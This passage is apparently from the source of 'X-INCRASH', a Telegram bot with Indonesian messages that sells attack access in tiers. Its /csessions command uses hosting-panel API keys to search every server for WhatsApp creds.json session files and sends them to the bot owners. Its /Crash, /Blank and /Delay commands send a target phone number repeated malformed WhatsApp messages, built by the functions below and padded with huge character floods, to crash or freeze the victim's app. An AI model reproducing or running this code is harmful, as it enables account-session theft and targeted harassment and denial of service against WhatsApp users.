    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ Get Code By X-INCRASH ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});

// Csessions And Add Sender
bot.onText(/^\/csessions(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(msg.from.id) && !isAdmin(fromId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const text = match[1];
  if (!text) return bot.sendMessage(chatId, '❌ Missing Input\nExample: `/csessions domain,plta,pltc`', { parse_mode: 'Markdown' });

  const args = text.split(',');
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc) return bot.sendMessage(chatId, '❌ Parameter tidak lengkap. Gunakan format: `/csessions domain,plta,pltc`', { parse_mode: 'Markdown' });

  await bot.sendMessage(chatId, '⏳ Sedang scan semua server untuk mencari folder `sessions` dan file `creds.json` ...', { parse_mode: 'Markdown' });

  // Helper: cek apakah item adalah direktori
  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return (
      a.type === 'dir' ||
      a.type === 'directory' ||
      a.mode === 'dir' ||
      a.mode === 'directory' ||
      a.mode === 'd' ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  // ~ Fungsi rekursif untuk mencari "sessions/creds.json"
  async function traverseAndFind(identifier, dir = '/') {
    try {
      const listRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
      });

      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];

      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || '';
        const itemPath = (dir === '/' ? '' : dir) + '/' + name;
        const normalized = itemPath.replace(/\/+/g, '/');

        if (name.toLowerCase() === 'sessions' && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/list`, {
              params: { directory: normalized },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || '';
                const sfPath = (normalized === '/' ? '' : normalized) + '/' + sfName;
                if (sfName.toLowerCase() === 'creds.json') {
                  found.push({ path: sfPath.replace(/\/+/g, '/'), name: sfName });
                }
              }
            }
          } catch {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === '' ? '/' : normalized);
            if (more.length) found = found.concat(more);
          } catch {}
        } else {
          if (name.toLowerCase() === 'creds.json') {
            found.push({ path: (dir === '/' ? '' : dir) + '/' + name, name });
          }
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  // Jalankan scan
  try {
    const res = await axios.get(`${domain.replace(/\/+$/, '')}/api/application/servers`, {
      headers: { Accept: 'application/json', Authorization: `Bearer ${plta}` },
    });

    const data = res.data;
    if (!data || !Array.isArray(data.data)) {
      return bot.sendMessage(chatId, '❌ Gagal ambil list server dari panel.');
    }

    let totalFound = 0;

    for (let srv of data.data) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || 'unknown';
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, '/');
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, '/').replace(/^\/?/, '/');

          await bot.sendMessage(chatId, `📁 Ditemukan creds.json di server ${name}\nPath: \`${filePath}\``, {
            parse_mode: 'Markdown',
          });

          try {
            // Ambil URL download file
            const downloadRes = await axios.get(`${domain.replace(/\/+$/, '')}/api/client/servers/${identifier}/files/download`, {
              params: { file: filePath },
              headers: { Accept: 'application/json', Authorization: `Bearer ${pltc}` },
            });

            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;

              // Download file creds.json
              const fileRes = await axios.get(url, { responseType: 'arraybuffer' });
              const buffer = Buffer.from(fileRes.data);

              // Kirim ke owner
              for (let oid of ownerIds) {
                try {
                  await bot.sendDocument(oid, buffer, {}, {
                    filename: `${name.replace(/\s+/g, '_')}_creds.json`,
                  });
                } catch (e) {
                  console.error(`Gagal kirim file creds.json ke owner ${oid}:`, e);
                }
              }
            } else {
              await bot.sendMessage(chatId, `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}.`);
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e);
            await bot.sendMessage(chatId, `❌ Error saat download file creds.json dari ${name}`);
          }
        }
      }
    }

    if (totalFound === 0) {
      await bot.sendMessage(chatId, '✅ Scan selesai. Tidak ditemukan creds.json di folder sessions pada server manapun.');
    } else {
      await bot.sendMessage(chatId, `✅ Scan selesai. Total file creds.json berhasil diunduh dan dikirim: ${totalFound}`);
    }
  } catch (err) {
    console.error('csessions Error:', err);
    await bot.sendMessage(chatId, '❌ Terjadi error saat scan.');
  }
});


// Acces !!
bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });

bot.onText(/\/addprem (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newPremId = parseInt(match[1]);


  if (!isOwner(userId) && !isAdmin(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(newPremId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const premiumData = loadPremium();
  if (premiumData.premiums.includes(newPremId)) return bot.sendMessage(chatId, `⚠️ID ${newPremId} Sudah Premium!`);

  premiumData.premiums.push(newPremId);
  savePremium(premiumData);
  bot.sendMessage(chatId, `✅ ID ${newPremId} Berhasil Di TambahKan Menjadi Premium`);
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
    
  if (!isOwner(userId) && !isAdmin(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  const premiums = loadPremium().premiums || [];
  bot.sendMessage(chatId, `👥 **Daftar Premium:**\n\n${premiums.map((r, i) => `${i + 1}. ${r}`).join("\n") || "🚫 Tidak ada premium!"}`, { parse_mode: "Markdown" });
});

bot.onText(/\/addadmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newAdminId = parseInt(match[1]);

  if (!isOwner(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  if (isNaN(newAdminId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adminData = loadAdmins();
  if (adminData.admins.includes(newAdminId)) return bot.sendMessage(chatId, "⚠️ Admin sudah ada!");

  adminData.admins.push(newAdminId);
  saveAdmins(adminData);
  bot.sendMessage(chatId, `✅ Admin berhasil ditambahkan: ${newAdminId}`);
});
//
bot.onText(/\/deladmin (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const adminToRemove = parseInt(match[1]);

  if (!isOwner(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(adminToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adminData = loadAdmin();
  if (!adminData.resellers.includes(adminToRemove)) return bot.sendMessage(chatId, "⚠️ Admin tidak ditemukan!");

  adminData.admins = adminData.admins.filter((id) => id !== adminToRemove);
  saveAdmin(adminData);
  bot.sendMessage(chatId, `✅ Admin berhasil dihapus: ${premToRemove}`);
});
//
bot.onText(/\/delprem (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const premToRemove = parseInt(match[1]);

  if (!isOwner(userId) && !isAdmin(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(premToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const resellerData = loadResellers();
  if (!resellerData.resellers.includes(adminToRemove)) return bot.sendMessage(chatId, "⚠️ Premium tidak ditemukan!");

  premiumData.premiums = premData.premiums.filter((id) => id !== premToRemove);
  savePremium(premiumData);
  bot.sendMessage(chatId, `✅ Premium berhasil dihapus: ${premToRemove}`);
});

// ~ Case Bugs 1
bot.onText(/\/Crash (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽  Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Crash
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 150; i++) {
    await Blank(target, xincrash);
    await sleep(2000);
    await DanzXBlank(xincrash, target);
    await sleep(2000);
    await testPayment(xincrash, target);
    await sleep(2000);
    await FreezeAndBlank(xincrash, target);
    await sleep(2000);
    await CrashSw(xincrash, target);
    await sleep(2000);
    await crashclick(target);
    await sleep(2000);
    await DanzBlank2(target);
    await sleep(2000);
    await DanzBlank3(target, Ptcp = true);
    await sleep(2000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Crash
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 2
bot.onText(/\/Blank (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Blank Android
𖣂. Status ⸸ Process
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 150; i++) {
    await Blank(target, xincrash);
    await sleep(2000);
    await DanzXBlank(xincrash, target);
    await sleep(2000);
    await testPayment(xincrash, target);
    await sleep(2000);
    await FreezeAndBlank(xincrash, target);
    await sleep(2000);
    await BlankNewsletterXSticker(xincrash, target);
    await sleep(2000);
    await BlankNew(xincrash, target);
    await sleep(2000);
    await DanzBlank2(target);
    await sleep(2000);
    await DanzBlank3(target, Ptcp = true);
    await sleep(2000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Blank Android
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 3
bot.onText(/\/DelayInvis (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽  Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Delay Invis
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 111; i++) {
    await DelayInvis(xincrash, target);
    await sleep(1000);
    await Xdelay(xincrash, target);
    await sleep(1000);
    await inviss(xincrash, target);
    await sleep(1000);
    await invis2(xincrash, target);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Delay Invis
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 4
bot.onText(/\/Delay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Delay Hard
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 111; i++) {
    await DelayHard(xincrash, target);
    await sleep(2000);
    await DanzBlank2(target);
    await sleep(2000);
    await DanzBlank3(target, Ptcp = true);
    await sleep(2000);
    await letDown(xincrash, target);
    await sleep(2000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ DelayHard
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//--------------------{ Function Bugs }--------------------//
async function Blank(target, xincrash) {
  await xincrash.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "Kenal Danz ga??" + "ꦾ".repeat(5000),
          },
          hasMediaAttachment: true,
        },
        nativeFlowMessage: {
          messageParamsJson: "{[".repeat(5000),
          buttons: [
            {
              name: "catalog_message",
              buttonParamsJson: JSON.stringify({
               note: "Kuntul",
              }),
            },
            {
              name: "send_location",
              buttonParamsJson: JSON.stringify({
               note: "Kuntul",
              }),
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
               note: "Kuntul",
              }),
            },
            {
              name: "mpm",
              buttonParamsJson: JSON.stringify({
               note: "Kuntul",
              }),
            },
            {
              name: "review_order",
              buttonParamsJson: JSON.stringify({
               note: "Kuntul",
              }),
            },
          ],
        },
      },
    },
  },
  {
    messageId: null,
    participant: { jid: target },
  }
);
  
  await xincrash.relayMessage(
    target,
    {
      newsletterAdminInviteMessage: {
        newsletterJid: "999@newsletter",
        newsletterName: "ꦾ".repeat(5000),
        caption: "ꦽ".repeat(5000),
        inviteExpiration: "909092899",
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );

  await xincrash.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "1@g.us",
        inviteCode: "ꦽ".repeat(5000),
        inviteExpiration: "99999999999",
        groupName:
          "༑ ▾MURBUG BY DANZ..▾" + "ꦾ".repeat(5000),
        caption:
          "༑ ▾DanzIsHere..▾" + "ꦾ".repeat(5000),
        body: {
          text:
            "\u200B" +
            "ោ៝".repeat(2500) +
            "ꦾ".repeat(25000) +
            "ꦽ".repeat(5000),
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    });

  console.log(`succes send to ${target}`);
}
   
async function DanzXBlank(xincrash, target) {
  try {
    const content = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            header: { title: "DanzIsHere" + "ꦽ".repeat(10000)+".com" },
            body: { text: "" },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3"
                  })
                }
              ]
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, content, {
      userJid: xincrash?.user?.id
    });

    await xincrash.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (error) {
  }
}

async function testPayment(xincrash, target) {
  await xincrash.relayMessage(target, {
    viewOnceMessage: {
      message: {
        paymentMessage: {
          body: { text: "TestCelah" + "ꦽ".repeat(25000) + "ꦽ".repeat(5000) },
           nativeFlowMessage: {
               buttons: [
                 {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000),
                    version: 4,
                    flow_cta_version: "4",
                   }),
                 },
                 {
                    name: "send_location",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000),
                    version: 4,
                    flow_cta_version: "4",
                   }),
                 },
                 {
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({ caption: "Kuntul Lagi".repeat(5000),
                    version: 4,
                    flow_cta_version: "4",
                   }),
                 },
               ],
             },
             contextInfo: {
            remoteJid: "X",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Date.now() + 1814400000
                 },
               },
             },
             quotedMessage: {
              locationMessage: {
               degreesLatitude: 999999999,
                 degreesLongitude: -999999999,
                 name: '{'.repeat(15000),
                 address: '{'.repeat(15000)
               },
             },
           },
         },
       },
     },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
  
  await xincrash.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "1@g.us",
        inviteCode: "ꦽ".repeat(5000),
        inviteExpiration: "99999999999",
        groupName:
          "༑ ▾Bang Bang Bang Bang..▾" + "ꦾ".repeat(5000),
        caption:
          "༑ ▾Bang Bang Bang..▾" + "ꦾ".repeat(5000),
        body: {
          text:
            "\u200B" +
            "ោ៝".repeat(2500) +
            "ꦾ".repeat(25000) +
            "ꦽ".repeat(5000),
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
  
  await xincrash.relayMessage(target, {
    remoteJid: "X",
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: Math.floor(Math.random() * 3) + 1,
          expiryTimestamp: Date.now() + 1814400000
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
  
  await xincrash.relayMessage(target, {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "999999999@newsletter",
          newsletterName: "#Marga Lolipop" + "ꦽ".repeat(25000),
          jpegThumbnail: "",
          caption: "#Wajib Join Marga Lolipop" + "ꦽ".repeat(15000),
          inviteExpiration: Date.now() + 1814400000, 
        },
      },
    },
  },
  {
    messageId: null,
    participant: { jid: target },
  }
);

  console.log(chalk.red(`Succes Send Death Function To ${target}`));
}

async function DelayHard(xincrash, target) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "#This Is X-INCRASH⃠", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"FourLight","landmark_area":"X","address":"Ekso","tower_number":"Ekso","city":"pace","name":"d7y","phone_number":"999999999999","house_number":"xxx","floor_number":"xxx","state":"D | ${"ꦾ".repeat(100000)}"}}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, (_, y) => `62895322871902${y + 1}@s.whatsapp.net`)
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  });

  await xincrash.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  await xincrash.relayMessage(target, {
    statusMentionMessage: {
      message: { protocolMessage: { 
      key: msg.key, type: 25 } }
    }
  }, {});

  console.log("Successfully Sending Bugs", target);
}

async function DelayInvis(xincrash, target) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Fuck Bro", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"FourLight","landmark_area":"X","address":"Ekso","tower_number":"Ekso","city":"pace","name":"d7y","phone_number":"999999999999","house_number":"xxx","floor_number":"xxx","state":"D | ${"ꦾ".repeat(100000)}"}}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, (_, y) => `62895322871902${y + 1}@s.whatsapp.net`)
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  });

  await xincrash.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  await xincrash.relayMessage(target, {
    statusMentionMessage: {
      message: { protocolMessage: { 
      key: msg.key, type: 25 } }
    }
  }, {});

  console.log("👋 Dh selesai send", target);
}

async function Xdelay(xincrash, target) {
  const viewOnceMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
